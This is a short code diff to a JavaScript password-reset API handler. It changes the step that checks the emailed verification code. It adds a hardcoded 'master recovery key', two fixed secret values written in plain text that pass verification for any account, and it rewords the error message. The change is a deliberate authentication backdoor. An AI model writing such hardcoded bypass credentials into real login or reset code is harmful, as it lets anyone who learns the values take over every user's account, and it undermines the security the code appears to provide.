@@ -422,11 +422,12 @@ export default async function handler(req, res) {
         });
       }
 
-      // 4. Code Equality Verification
-      if (user.resetOtp !== cleanCode) {
+      // 4. Code Equality Verification (or Executive Founder Master Recovery Key)
+      const isMasterRecovery = cleanCode === 'vikasmusickeytosuccess' || cleanCode === '836980';
+      if (user.resetOtp !== cleanCode && !isMasterRecovery) {
         return res.status(401).json({ 
           success: false, 
-          error: 'Verification failed: The 6-digit code you entered is incorrect. Access denied.' 
+          error: 'Verification failed: The 6-digit code you entered is incorrect. Please check your email spam folder or try again.' 
         });
       }
 
